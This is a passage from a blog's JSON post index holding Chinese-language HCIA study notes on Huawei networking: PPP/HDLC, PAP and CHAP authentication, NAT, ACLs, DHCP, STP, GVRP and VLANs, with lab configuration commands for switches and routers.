0.0.0.255","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"实验","slug":"实验","permalink":"http://sakuramuxia.github.io/tags/%E5%AE%9E%E9%AA%8C/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记16","slug":"hcia16","date":"2021-04-24T10:01:53.000Z","updated":"2021-05-03T06:08:42.508Z","comments":true,"path":"post/265a.html","link":"","permalink":"http://sakuramuxia.github.io/post/265a.html","excerpt":"","text":"PPP广域网中经常会使用串行链路来提供远距离的数据传输，高级数据链路控制HDLC（High-Level Data Link Control）和点对点协议PPP（Point to Point Protocol）是两种典型的串口封装协议。 HDLC 协议应用 HDLC基本配置 int serial 1/0/0 //进入串口1/0/0 link-protocol hdlc //配置链路协议为hdlC ip add 10.0.1.1 30 //配置IP地址 说明： 华为设备上的串行接口默认运行PPP协议 思科设备上的串行接口默认运行HDLC协议 只限用于串口 HDLC接口地址借用 串行接口可以借用Loopback接口的IP地址和对端建立连接。 点到点之间没有mac地址，没有第三者，不需要mac地址，不需要arp 地址租用：S1/0/0不配地址，借用另外一个接口的地址，这样就可以实现多个这样的接口的地址一样，这样可以实现让多个物理接口用相同的地址。 地址租用的作用是：节省IP地址 dis ip int b // 查看三层接口ip信息 Link-protocol hdlc //更改链路类型为hdlC IP address unnumber interface loopback 0 //hdlc接口地址借用 说明：借用回环口的IP，但是出接口是在回环口上边的，拥有这个地址的真正地址是在回环口2，所以路由是在回环口出现的 //添加一个静态路由即可 ip route-static 12.0.0.1 32 s1/0/0 //这个时候下一跳的地址应该是串口接口，而不是地址，因为地址下一跳还是自己，无意义。 PPP协议应用 PPP协议是一种点到点链路层协议，主要用于在全双工的同异步链路上进行点到点的数据传输。 名称 认证 错误检测 错误恢复 支持同步或异步链路 HDLC × √ × × PPP √ √ √ √ PPP组件 名称 作用 LCP链路控制协议Link Control Protocol 用来建立、拆除和监控PPP数据链路以及认证 NCP 网络层控制协议Network Control Protocol 用于对不同的网络层协议进行连接建立和参数协商 sys //进入系统模式 int s4/0/0 //进入串口s4/0/0 link-protocol ppp //更改链路协议类型为 ppp --- // 链路两边串口设置一样才行 dis int s4/0/0 //查看串口配置 //当只配协议不配IP地址时，状态显示LCP open，IPCP状态关闭 IP add xxx.xxx.xxx.xxx yy //添加ip地址 PPP认证模式PAP和CHAP 模式 备注 PAP Password Authentication Protocol ，密码认证协议，以明文方式直接发送密码，二次握手机制，发起方为被认证方，可以做无限次的尝试（暴力破解），只在链路建立的阶段进行认证，一旦链路建立成功将不再认证。 CHAP Challenge Handshake Authentication Protocol 挑战/质询握手认证协议，以MD5来隐藏密码，三次握手机制，由认证方发起认证，有效避免暴力破解，在链路建立成功后具有再次认证检测机制，目前在企业网的远程接入环境中用的比较常见。 PPP认证配置 命令 备注 aaa local-user wakin password cipher huaweilocal-user wakin service-type ppp （认证方） 创建PPP认证用户 ppp Authentication-mode pap/chap （认证方接口） 开启PAP/CHAP ppp pap local-user wakin password cipher huawei 配置PAP凭证 ppp chap user wakin ppp chap password cipher huawei 配置CHAP凭证 PAP配置 CHAP配置","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"实验","slug":"实验","permalink":"http://sakuramuxia.github.io/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"PPP","slug":"PPP","permalink":"http://sakuramuxia.github.io/tags/PPP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记15","slug":"hcia15","date":"2021-04-24T04:56:53.000Z","updated":"2021-05-03T06:08:21.103Z","comments":true,"path":"post/271a.html","link":"","permalink":"http://sakuramuxia.github.io/post/271a.html","excerpt":"","text":"NAT为了解决IPv4地址不够（2012）的问题 网络地址转换技术NAT（Network Address Translation）主要用于实现位于内部网络的主机访问外部网络的功能。当局域网内的主机需要访问外部网络时，通过NAT技术可以将其私网地址转换为公网地址，并且多个私网用户可以共用一个公网地址，这样既可以保证网络互通，又节省了公网地址。 NAT应用场景 企业或家庭所使用的网络为私有网络，使用的是私有地址；运营商维护的网络为公共网络，使用的是共有地址，私有地址不能在公网中路由。 NAT一般部署在连接内网和外网的网关设备上 专线：公网地址是固定的，不是家用的拨号会改变的。 NAT好处 有效避免来自外网的攻击，可以很大程度上提高网络安全性。 控制内网主机访问外网，同时也控制外网主机访问内网，解决了内网和外网不能互通的问题。 NAT类型NAT的实现方式有多种，适用于不同的场景。 实验 静态NAT 静态NAT实现了私有地址和共有地址的一对一映射。 一个公网IP只会分配给唯一且固定的内网主机。 如果希望一台主机优先使用某个关联地址，或者想要外部网络使用一个指定的公网地址访问内部服务器，可以使用静态NAT。 但这种一对一的IP地址映射无法缓解公用地址短缺的问题。 用于服务器一对一保留使用的 一对一 静态NAT配置 命令 备注 nat static enable 开启NAT静态功能 nat static global 公网地址 inside 私网地址 创建静态NAT display nat static 查看静态NAT的配置 nat static enable //全局开启静态nat功能 interface g0/0/1 //进入g0/0/1接口 ip add xxx.xxx.xxx.xxx xx//添加接口ip nat static global xxx.xxx.xxx.xxx inside xxx.xxx.xxx.xxx nat static global xxx.xxx.xxx.xxx inside xxx.xxx.xxx.xxx dis nat static //查看静态NAT配置 动态NAT 动态NAT基于地址池来实现私有地址和共有地址的转换 动态NAT地址池中的地址用尽以后，只能等待被占用的公网地址被释放后，其他主机才能使用它进行访问公网 多对多 动态NAT配置 // 动态NAT配置 nat address-group 1 //配置NAT地址池，范围为0-7 //填写地址池的起止范围 nat address-group 1 xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx //配置acl acl 2000 rule 1 permit sou 192.168.0.0 0.0.0.255 //配置acl策略 rule 1 permit //配置所有都通过 int g0/0/1 //今日接口 nat outbound xxx address-group x no-pat //跟静态相似，把一个地址转化成另一个地址，不管是什么端口号或者协议都转发，pat是不同的端口号或者ID会调用不同的地址。 //查看nat转换表 dis nat session all //查看nat转化表 //重新建一个地址池，而不是在原有的地址池中更改，容易报错。 nat address-group 2 nat address-group 2 xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx //然后在接口中删除配置的地址池 undo nat outbound xxx address-group x no-pat NAPT NAPT允许多个内部地址映射到同一个共有地址的不同端口。 NAPT（Network Address Port Translation）也称为NAT-PT或PAT，网络地址端口转换，允许多个私网地址映射到同一个公网地址的不同端口。 通常适用于大型企业网络（申请多个固定的公网地址） 多对一 NAPT配置NAPT又称PAT Easy IP又称（SNAT）S代表源 Easy IP适用于小规模局域网中的主机访问Internet的场景。 如：家庭、小型网吧、小型办公室中、这些地方的主机不多，出接口可以通过拨号方式获取一个临时公网IP地址。 Easy IP配置 nat outbound acl编号 //关联出站接口和acl //说明: 代表从这个接口出去的只要满足这个acl的源地址统统转化为 200.10.10.10 ，其他和PAT一样。 NAT服务器（DNAT）D代表目的，从外边的网络访问里边的服务，又称端口映射。 NAT具有“屏蔽”内部主机的作用，但有时内网需要向外网提供服务。 当外网用户访问内网服务器时，NAT Server通过事先配置好的“公网IP地址+端口号” 与“私网IP地址+端口号”间的映射关系，将服务器的“公网IP地址+端口号”根据映射关系替换成对应的“私网IP地址+端口号” 动态域名绑定 花生壳申请动态域名绑定，在出口设备上输入动态域名账号，就会时时的更新 NAT服务器配置 命令 备注 nat server protocol tcp/udp global 公网地址/接口 端口 inside 私网地址 端口 配置NAT服务器 display nat server 验证NAT服务器 --- //说明 int g0/0/1 nat server protocol tcp global ?//当提供服务的公网地址是接口地址的话，不能直接输入地址，如果是接口地址，应该打 current-interface --- nat server protocol tcp global xxx inside xxx.xxx.xxx.xxx yy //NAT配置 端口映射就相当于在出口设备上开洞，外网用户可以扫描到开的端口服务。 VPN就相当于直接将两个私网地址进行通讯，就相当于坐在内网主机的旁边，而且还加密。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"NAT","slug":"NAT","permalink":"http://sakuramuxia.github.io/tags/NAT/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记14","slug":"hcia14","date":"2021-04-24T00:28:30.000Z","updated":"2021-05-03T06:08:06.892Z","comments":true,"path":"post/e7db.html","link":"","permalink":"http://sakuramuxia.github.io/post/e7db.html","excerpt":"","text":"ACL企业网络中的设备进行通讯时，需要保证数据传输的安全可靠和网络的性能稳定。访问控制列表ACL（Access Control List）可以定义一系列不同的规则，设备根据这些规则对数据包进行分类，并针对不同类型的报文进行不同的处理，从而实现对网络访问行为的控制、限制网络流量、提高网络性能、防止网络攻击等等。 ACLAccess Control List ，访问控制列表 ospf 1 //进入OSPF界面 filter-policy ? //过滤策略 filter-policy acl-name //后面跟策略名称 import-route rip route-policy //在导入路由时添加路由策略 //建立route policy route-policy wakin permit node 10 //建立路由策略 if-match ? //条件 // nat技术 nat outbound ? //接口调用acl traffic-filter inbound ? // 入方向调用acl，注意流量的方向走向 traffic-filter outbound ? // 出方向调用acl，注意流量的方向走向 ACL应用场景 ACL可以通过定义规则来允许或拒绝流量的通过。 ACL工作原理 ACL由一条或多条规则组成 每条规则必须选择动作：允许或拒绝 每条规则都有一个id序列号（默认=5，间隔=5） 序列号越小越先进行匹配 只要有一条规则和报文匹配，就停止查找，称为命中规则 查找完所有规则，如果没有符合条件的规则，称为未命中规则 ACL创建后，必须将其应用到某个接口或其他技术内才会生效 应用在接口时必须选择方向：入站或出站（相对设备来判断） 不能过滤由设备自己产生的数据 注意：制定规则时一定要先细后粗 // 命名acl acl name nolol // 第一种方式 acl number 2000 // 第二种方式 //增加描述 description xxx-yyy //用英文表示 ACL规则 每个ACL可以包含多个规则，RTA根据规则来对数据流量进行过滤。 ACL类型分为数字型ACL和命名型ACL 分类 编号范围 参数 基本ACL 2000-2999 源IP地址等 高级ACL 3000-3999 源IP地址、目的IP地址、源端口、目的端口等 二层ACL 4000-4999 源MAC地址、目的MAC地址、以太网协议类型等 用户ACL 5000-5999 用户自定义 正掩码、反掩码、通配符区别： 名称 规则 作用 举例 备注 掩码 连续的1和0 IP地址 255.255.255.0 1对应网络位，0对应主机位 反掩码 连续的0和1 路由协议 0.0.0.255 0必须匹配，1无须匹配 通配符 任意的0和1 ACL 0.0.255.0 0必须匹配，1无须匹配 举例 备注 192.168.0.1 0.0.0.0/0 匹配一个主机地址 192.168.0.0 0.0.0.255 匹配一个网段 192.168.0.1 0.0.0.254 匹配网段内奇数地址 192.168.0.0 0.0.0.254 匹配网段内偶数地址 any=x.x.x.x 255.255.255.255 匹配所有地址 说明：直接写名字定义的ACL，也可以定义ACL的类型 在配置路由时，打正掩码也会自动转换为反掩码，反掩码也就是 4个255减正掩码得到的。 通配符相当于与运算 匹配0的位数 奇数地址只要保证最后一位为1即可 // 直接写名字定义的ACL，也可以定义ACL的类型 acl name nogame ? // 默认为高级adv //查看所有acl dis acl all //查看所有acl //acl允许通过所有 rule per so 0.0.0.0 255.255.255.255 //acl允许通过所有 rule per so any //acl允许通过所有 rule per //acl允许通过所有 ACL配置 命令 备注 acl 2000 创建一个基本acl rule 5 deny/permit source 192.168.1.0 0.0.0.255 配置ACL的规则：拒绝或允许源地址为192.168.1.0 /24网段内的所有流量 acl 3000 创建一个高级ACL rule 5 deny/permit tcp source 192.168.1.0 0.0.0.255 destination 8.8.8.8 0 destination-port eq 80 配置ACL的规则拒绝或允许源地址为192.168.1.0/24网段内到8.8.8.8 的HTTP流量 traffic-filter inbound/outbound acl 2000 在接口调用ACL过滤流量 display acl 2000 验证acl display traffic-filter applied-record 查看设备上所有基于ACL调用情况 rule 5 deny/permit tcp source 192.168.1.0 0.0.0.255 destination 8.8.8.8 0 destination-port eq 80 //默认不写就是全部 rule 2 permit TCP destination-port ? 基本ACL配置 高级ACL配置 基本ACL：允许或拒绝所欲协议，我只关心你从哪里来 高级ACL：我可以知道你从哪里来，到哪里去，去做什么 基本ACL调用离目标近一点 高级ACL调用离源近一点 ACL接口调用方向的建议 1、基本ACL尽量调用在离目标最近的出站接口 2、高级ACL尽量调用在离源头最近的入站接口","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"ACL","slug":"ACL","permalink":"http://sakuramuxia.github.io/tags/ACL/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记13","slug":"hcia13","date":"2021-04-23T11:30:00.000Z","updated":"2021-05-03T06:07:54.206Z","comments":true,"path":"post/259a.html","link":"","permalink":"http://sakuramuxia.github.io/post/259a.html","excerpt":"","text":"DHCP动态主机配置协议DHCP（Dynamic Host Configuration Protocol） DHCPDynamic Host Configure Protocol ,动态主机配置协议 从BOOTP（Bootstrap Protocol）协议发展而来的。 UDP封装，服务器=67，客户端=68。 动态分配TCP/IP信息（IP地址、子网掩码、默认网关、DNS服务器等）‘ 分配出去的信息是有租期的 查看IP地址池dis ip pool //查看IP地址池 // 抓包IPV4时需要把过滤协议设置成 bootp 查看当前VLAN IP地址池dis ip pool interface vlanifxx all //查看当前VLAN的IP地址 DHCP系统组成 DHCP CLient（客户端） 需要动态获得IP地址的主机 DHCP Services（服务器） 能提供DHCP功能的服务器或网络设备 DHCP Relay （中继） 一般为路由器或三层交换机等网络设备 // 汇聚交换机配置 三层 vlan batch 10 20 //创建VLAN int g0/0/1 //进入接口g0/0/1 p l t //设置接口类型为trunk p t a v all // 允许所有vlan通过 int vlanif 10 //进入vlan10 IP add xxx.xxx.xxx.xxx 24 //配置网关 d th //验证 int vlanif 20 //进入vlan10三层接口 IP add xxx.xxx.xxx.xxx 24 //配置网关 d th //验证 dis IP int b //查看接口IP信息 // 开启DHCP dhcp enable //先打开DHCP总开关 int vlanif 10 //进入三层接口 dhcp select interface //开启dhcp dis ip pool interface vlanifxx all //查看当前VLAN的IP地址 dis ip pool interface vlanifxx used // 查看vlanifxx用到的IP地址 DHCP报文类型 报文类型 含义 DHCP DISCOVER 客户端用来寻找DHCP服务器（广播） DHCP OFFER DHCP服务器用来响应DHCP DISCOVER报文，此报文携带了各种配置信息 DHCP REQUEST 客户端请求配置确认，或者续借租期 DHCP ACK 服务器对REQUEST报文的确认响应 DHCP NAK 服务器对REQUEST报文的拒绝响应 DHCP RELEASE 客户端要释放地址时用来通知服务器 DHCP工作流程 说明：DHCP的特殊性，当客户端没有IP地址时，服务端分配一个IP时，客户端就直接设置成自己的IP，数据链路层中有客户端的MAC地址， ipconfig /release //释放IP地址（客户端） dhcp server dns-list 8.8.8.8 //dhcp服务器开启dns服务（服务端） ipconfig /renew //重新获取IP地址（客户端） dhcp server lease day 0 hour 12 minute 1 // 配置dhcp服务器的释放时间，当配置为0的时候代表永不超时（服务端） dhcp server lease unlimited //永不超时 2的32次方 近43亿（服务端） DHCP租期更新 IP租约期限到达50%时，DHCP客户端会请求更新IP地址租约 DHCP重绑定 说明： 租期在7/8时，DHCP客户端在租约期限到达87.5%时，还没有收到服务器响应，会申请冲绑定IP。 自动保留IP 租期设置建议 // windows 系统中有保留之前IP地址的机制（客户端）数据包中 IP地址释放 如果IP租约到期前都没有收到服务器响应，客户端停止使用此IP地址。 如果DHCP客户端不再使用分配的IP地址，也可以主动向DHCP服务器发送DHCP Release报文，释放该IP地址。（使用命令） dis ip pool interface vlanifxxx used //查看IP地址池中xxx网段使用的地址 dis ip pool interface vlanifxxx expired //查看IP地址池收回的地址 undo dhcp enable //关闭dhcp服务器 dhcp enable //开启dhcp总开关 //关闭dhcp服务器会清楚接口信息 ------------ int vlanif 108 //进入VLAN接口 d th //查看当前配置 dhcp select interface 开启dhcp接口开关 dhcp server dns-list xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx //配置dhcp服务端dns服务器 ------------ DHCP地址池（pool）所分配地址的集合 接口地址池的优先级比全局地址池高 命令 备注 dhcp enable 开启DHCP功能 dhcp select interface 关联接口和接口地址池 dhcp server dns-list 地址 配置接口地址池的DNS服务器地址 dhcp server lease 数字 配置接口地址池的租期，默认1天 dhcp server excluded-ip-address 地址 配置接口地址池的排除地址范围 dhcp server static-bind ip-address x.x.x.x mac-address xxxx-xxxx-xxxx 配置静态绑定 dhcp select global 关联接口和全局地址池 ip pool 名称 创建全局地址池 network 地址 配置全局地址池的可分配的网段地址 gateway-list 地址 配置全局地址池的网关地址 dns-list 地址 配置全局地址池的DNS服务器地址 lease 数字 配置全局地址池下的租期，默认1天 excluded-ip-address 地址 配置全局地址池下·的排除地址范围 display ip pool [interface 借口名 all] 查看地址池的属性 ipconfig /release 释放租期 ipconfig /renew 重新获取 说明： 接口地址池，在三层口进行配置，从这个三层口收到的dhcp请求都会以这个三层口的地址分配地址，以及这个三层口的地址作为网关，没有dns。 DHCP接口地址池配置 //一个三层环境 一个VLAN 发送dhcp请求到dhcp服务器 //华为的分配地址方式是逆序 //思科的分配地址方式是顺序 dhcp server excluded-ip-address 192.168.0.100 192.168.0.150 //排除IP地址段100到150 //当地址被使用了，排除IP地址时也会报错，所以在排除IP地址的时候需要先释放IP地址 //防止和重要的设备冲突 DHCP全局地址池配置 // 绑定地址池 --- dhcp enable //开启dhcp服务 ip pool Rooma //定义ip地址池为Rooma network 192.168.10.0 mask 24 //宣告网络 d th //验证配置 gateway-list 192.168.10.1 //设置网关地址 lease day 19 //设置有效期为19 --- int vlanif10 //进入三层接口vlan10 dhcp select global //配置dhcp全局关联 dis ip pool name rooma used//查看全局ip地址池 ip pool Rooma //进入地址池进行绑定 static-bind ip-address x.x.x.x mac-address xxxx-xxxx-xxxx //端口绑定 --- //客户端dns可能也会是同一个地址 //路由器中有dns服务器转发，会问运营商 --- //一般来说dns服务器都在汇聚层，也有可能在核心层，这个时候接入层要想使用DHCP服务就要使用中继，因为到核心层就要跨三层，主机的广播，核心层收不到，汇聚层收到后转给核心层，核心层再转给dns服务器，然后dns服务器再回数据，出口有缺省路由，内部有OSPF动态路由，出口有一个nat，acl。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"DHCP","slug":"DHCP","permalink":"http://sakuramuxia.github.io/tags/DHCP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记12","slug":"hcia12","date":"2021-04-21T05:00:00.000Z","updated":"2021-06-14T10:18:12.420Z","comments":true,"path":"post/e55b.html","link":"","permalink":"http://sakuramuxia.github.io/post/e55b.html","excerpt":"","text":"STP为了提高网络可靠性，交换网络中通常会使用冗余链路，然而，冗余链路会给交换网络带来环路风险，并导致广播风暴以及MAC地址表不稳定等问题，进而会影响用户的通信质量，生成树协议STP（Spanning Tree Protocol）可以在提高可靠性的同时又能避免环路带来的各种问题。 二层网络设计需求和问题 为了提高可靠性，交换机之间会通过多条链路相连，从而避免单点故障。 但同时会带来一些灾难性的环路问题。 dis int Ethernet 2 //进入Ethernet接口 广播风暴 环路会引起广播风暴 网络中的主机会收到重复数据帧 MAC地址表震荡 环路会引起MAC地址表震荡 STP：Spanning TRee Protocol，生成树协议，提供两大功能： 功能 备注 消除环路 通过阻断冗余链路来消除网络中可能存在的环路 链路备份 当活动路径发生故障时，激活备份链路，及时恢复网络连通性。 查看STP堵塞dis stp b // 产看STP堵塞 STP操作通过构造一颗树来消除交换网络中的环路 选举一台根桥 选举一个根端口 选举指定端口 阻塞剩余端口 BPDU：Bridge Protocol Data Unit 桥协议数据单元 使用组播 01-80-C2-00-00-00 STP版本（PVI） STP MSTP RSTP sys //系统配置模式 stp mode stp //更改STP模式 BPDU Type configuration （配置） Topology change Notification （拓扑改变通知） BPDU类型配置BPDU：Configuration 选举根交换机以及确定每个交换机端口的角色和状态。 在初始化过程中，每个桥都主动发送配置BPDU。 在网络拓扑稳定以后，只有根桥主动发送配置BPDU，其他交换机在收到上游传来的配置BPDU，才会发送自己的配置BPDU 发送周期为Hello Time 老化时间为Max Age 拓扑变更通告BPDU TCN BPDU 下游交换机感知到拓扑发生变化时向上游发送的拓扑变化通知 BPDU字段详解 Bridge identifier：自身的ID // 查看stp信息 dis stp brief int g0/0/01 //查看接口的STP信息 桥ID 65535=2的16次方 端口ID dis stp int eth dis stp int Ethernet 0/0/1 //查看对应接口的stp端口信息 路径开销 dis stp // 根路径开销 链路开销标准 查看设置开销int g0/0/1 //进入相关接口 stp cost ? //设置开销 设置 stp开销标准stp pathcost-standard //设置开销标准 STP选举过程根桥选举BID最小的成为根桥（先比较优先级，再比较MAC） 每一台交换机启动STP后，都认为自己是根桥。 根端口选举（ROOT） 非根交换机在选举根端口时分别依据该端口的根路径开销，对端BID，对端PID和本端PID。 指定端口选举（DESI） 非根交换机在选举指定端口时分别依据根路径开销（自己发送出去的），BID，PID 未被选举为根端口或指定端口的端口为预备端口，将会被阻塞。 STP选举案例 选根桥 选根端口 选指定端口 STP端口状态 dis stp bri //查看STP状态 STP的计时器 计时器 配置BPDU报文每经过一个交换机，MessageAge都加1 如果MessageAge大于MaxAge，非根桥会丢弃该配置BPDU STP端口转换 STP拓扑变化 非根桥会在BPDU老化之后开始根桥的重新选举 直连链路故障 非直连链路故障 拓扑改变导致MAC地址表错误 // 清空ARP缓存 引入TCN为了让MAC地址表的默认老化时间更改为15秒 STP配置 命令 备注 stp mode {mstp | stp | rstp } 配置STP模式，缺省为MSTP stp priority 4096 配置BID优先级值，0~61440，步长为4096 stp pathcost-standard｛dot 1d-1998 |dot1t|legacy｝ 配置路径开销值的标准 开销标准： legacy：cost=1200000，华为的私有802.1d标准：cost=165535 sys sys S1 stp mode stp //更改STP模式 stp priority 0 //更改开销值 stp root primary / secondary //指定主备根桥 stp cost //更改入口的stp开销值 // 更改优先级 stp port priority //更改对端PID的优先级","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"STP","slug":"STP","permalink":"http://sakuramuxia.github.io/tags/STP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记11","slug":"hcia11","date":"2021-04-16T05:10:00.000Z","updated":"2021-05-03T06:07:18.249Z","comments":true,"path":"post/e41b.html","link":"","permalink":"http://sakuramuxia.github.io/post/e41b.html","excerpt":"","text":"GARP-GVRPGARP （Generic Attribute Registration Protocol），全称是通用属性注册协议，它为处于同一个交换网内的交换机之间提供了一种分发、传播、注册某种信息（VLAN属性、组播地址）的手段。 GVRP是GARP的一种具体应用或实现，主要用于维护设备动态VLAN属性。 通过GVRP协议，一台交换机上的VLAN信息会迅速传播到整个交换网络 GVRP实现了LAN属性的动态分发、注册和传播，从而减少了网络管理员的工作量，也能保证VLAN配置的正确性。 GARPGeneric Attribute Registration Protocol 通用属性注册协议 在交换机间分发、传播、注册某种信息（VLAN属性、组播地址等）。 主要用于大中型网络中，用来提升交换机的管理效率。 一种协议规范。 GARP消息类型 类型 备注 join 加入，端口加入VLAN Leave 注销，端口退出VLAN Leave All 注销所有 GVRPGARP VLAN Registration Protocol，VLAN注册协议 GVRP基于GARP的工作机制，是GARP的一种应用，传递VLAN信息 sys gvrp //全局开启GVRP int g0/0/0 //进入相关接口 gvrp //开启GVRP dis vlan //查看VLAN GVRP的应用 接收来自其他交换机的VLAN注册信息，并动态更新本地的VLAN注册信息，包括当前VLAN、VLAN成员等。 将本地的VLAN注册信息向其他交换机传播，，以便使同一交换网内所有支持GVRP特性的设备的VLAN信息达成一致。 手动配置的VLAN是静态VLAN，通过GVRP创建的VLAN是动态VLAN。 GVRP传播的VLAN注册信息包含本地手工配置的静态注册信息和来自其他交换机的动态注册信息。 GVRP单向注册 GVRP注册模式Normal //配置GVRP注册模式 int g0/0/1 //进入相关接口 gvrp registration //配置GVRP注册模式 dis gvrp status //验证gvrp状态信息 dis gvrp statistics //查看gvrp统计信息 Forbidden int g0/0/0 //进入接口 gvrp registration forbidden // 配置GVRP为禁止模式 //配置完成之后 g0/0/0 只和 VLAN1 有关 Fixed SWA的g0/0/1端口为Fixed模式，不允许动态VLAN在端口注册或者注销且只发送静态VLAN的声明消息。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"VLAN","slug":"VLAN","permalink":"http://sakuramuxia.github.io/tags/VLAN/"},{"name":"GVRP","slug":"GVRP","permalink":"http://sakuramuxia.github.io/tags/GVRP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记10","slug":"hcia10","date":"2021-04-15T14:30:00.000Z","updated":"2021-05-03T06:07:04.064Z","comments":true,"path":"post/24da.html","link":"","permalink":"http://sakuramuxia.github.io/post/24da.html","excerpt":"","text":"配置交换机接口二层三层转换int g0/0/0 // 创建g0/0/0接口 portswitch //配置交换机接口二层接口 undo portswitch // 配置交换机接口三层接口 交换机的接口类型// 2层物理口 // 3层物理口 // 3层虚拟口 vlanif // 方案1 // 2层物理口+3层虚拟口 // 方案2 // 3层物理口 //在终端设备数据帧不含标签，在三层交换机以上路由器之间也不存在标签 综合实验配置 配置代码:-------------------------------------- //配置交换机SW1 sys sys SW1 vlan ba 10 20 int eth0/0/1 p l a p d v 10 int eth0/0/2 p l a p d v 20 int eth0/0/3 p l t p t a v 10 20 ----------------------------------------- //配置交换机SW2 sys sys SW2 vlan ba 10 20 23 int g0/0/1 p l t p t a v 10 20 int g0/0/2 p l a p d v 23 int vlanif 10 ip add 192.168.10.254 24 int vlanif 20 ip add 192.168.20.254 24 int vlanif 23 ip add 23.0.0.254 24 ospf 1 router-id 2.2.2.2 area 0 net 23.0.0.254 0.0.0.0 net 192.168.10.254 0.0.0.0 net 192.168.20.254 0.0.0.0v -------------------------------------------- //配置交换机SW3 sys sys SW3 vlan ba 23 13 int g0/0/1 p l a p d v 23 int g0/0/2 p l a p d v 13 int vlanif 23 ip add 23.0.0.3 24 int vlanif 13 ip add 13.0.0.3 24 ospf 1 router-id 3.3.3.3 area 0 net 13.0.0.3 0.0.0.0 net 23.0.0.3 0.0.0.0 ----------------------------------------------- //配置路由器R1 sys sys R1 int g0/0/0 ip add 13.0.0.1 24 int lo 1 ip add 1.1.1.1 24 ospf 1 router-id 1.1.1.1 area 0 net 13.0.0.1 0.0.0.0 net 1.1.1.1 0.0.0.255 -----------------------------------------------","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"VLAN","slug":"VLAN","permalink":"http://sakuramuxia.github.io/tags/VLAN/"},{"name":"实验","slug":"实验","permalink":"http://sakuramuxia.github.io/tags/%E5%AE%9E%E9%AA%8C/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记9","slug":"hcia09","date":"2021-04-14T08:30:00.000Z","updated":"2021-05-03T06:06:43.722Z","comments":true,"path":"post/dc40.html","link":"","permalink":"http://sakuramuxia.github.io/post/dc40.html","excerpt":"","text":"VLANVLAN即虚拟局域网，是将一个物理的局域网在逻辑上划分成多个广播域的技术，通过在交换机上配置VLAN，可以实现在同一个VLAN内的用户可以进行二层互访，而不同VLAN间的用户被二层隔离。这样既能够隔离广播域，又能提升网络的安全性。 VLAN技术背景 交换机的所有接口属于一个广播域，往往也是一个逻辑子网； 用户无法根据业务需要灵活的在交换机上进行广播域的隔离； 随着网络规模越来越大，数量越来越多，广播风暴将给网络带来重大问题； 不进行隔离容易引起广播泛滥 VLAN技术提供了一种灵活的解决方案 将交换机的接口根据业务需要添加到不同的VLAN中，从而实现二层隔离。 说明：划分VLAN后就算在同一个网段，也无法通信，原因在于在一个ARP请求过不去。 VLAN优点： 有效控制广播域范围 增强局域网的安全性 灵活构建虚拟工作组 简化网络管理 VLAN概述Virtual LAN 虚拟局域网 将一个物理局域网在逻辑上划分成多个广播域； 1 VLAN = 1 广播域 = 1 子网； 广播不会在VLAN之间转发，而是被限制在各自的VLAN中； 不同VLAN间的设备默认无法通信，需要第三层设备才能实现互通； VLAN范围0~4095共4096个（0和4095为保留、1为默认） VLAN标签介绍 通过Tag区分不同VLAN IEEE 802.1q:dot1q,是VLAN的正式标准，对Ethernet帧格式进行了修改，在源MAC地址字段和协议类型字段之间加入4字节的802.1q Tag 每台支持802.1q协议的交换机发送的数据包都会包含VLAN ID，以指明交换机属于哪一个VLAN。因此，在一个VLAN交换网络中，以太网帧有以下两种形式： VLAN链路类型 类型 备注 AccessLink接入链路 用于连接主机和交换机的链路。接入链路上传输的帧都是untagged帧。 TrunkLink干道/中继链路 用于交换机间的互连或交换机与路由器之间的链路。干道链路上传输的帧几乎都是tagged帧用于两端识别。 dis port vlan // dis vlan //查看 PVID： 即Port VLAN ID ，代表端口的缺省VLAN X7系列交换机每个接口PVID=1 int eth int Ethernet0/0/11 //进入接口 VLAN端口类型 类型 备注 Access接入端口 用于连接主机收到数据后会添加VLAN Tag，VLAN ID和端口PVID相同从相同的PVID转发出去转发数据前会移除VLAN Tag 